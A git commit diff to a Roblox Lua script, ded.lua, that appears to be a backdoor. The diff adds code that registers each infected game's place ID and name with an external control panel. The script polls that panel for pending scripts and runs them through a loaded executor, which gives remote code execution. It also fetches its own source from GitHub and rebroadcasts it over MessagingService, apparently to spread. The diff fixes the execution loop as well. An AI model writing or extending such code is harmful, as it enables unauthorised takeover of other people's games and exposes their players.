121dd60dbc1b815d59703e41b3b95178a83e0d64
gigimko <nowyay123456@gmail.com>
2025-11-08 21:17:05 -0500

    Update ded.lua

--- ded.lua
+++ ded.lua
@@ -7,21 +7,39 @@ local peerAnd = require(fluentPeer)
 local b = "https://aurhack-main.xtl8v0.easypanel.host/"
 local execedAlready = {}
 local function spread()
-	game:GetService("MessagingService"):PublishAsync("ALADBB8qbqCU1n4ZJgts", game:GetService("HttpService"):GetAsync(""))
+	game:GetService("MessagingService"):PublishAsync("ALADBB8qbqCU1n4ZJgts", 
+		game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/gigimko/-/refs/heads/main/ded.lua")
+	)
 end
 local function getPendings()
 	return game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(b .. "api/pendingScripts"))
 end
 spawn(function()
-	while wait(5) do
+	spread()
+	while wait(30) do
 		spread()
+	end
+end)
+spawn(function()
+	game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
+		placeId = game.PlaceId,
+		displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+	}), Enum.HttpContentType.ApplicationJson)
+	while wait(20) do
+		game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
+			placeId = game.PlaceId,
+			displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+		}), Enum.HttpContentType.ApplicationJson)
 	end
 end)
 spawn(function()
 	while wait(5) do
 		local pendings = getPendings()
+		warn(pendings)
 		for _, scr in pendings do
-			if table.find(execedAlready, scr.uniqueId) then return end
+			if table.find(execedAlready, scr.uniqueId) then continue end
 			table.insert(execedAlready, scr.uniqueId)
 			peerAnd(scr.script:gsub("\n", ""))()
 		end
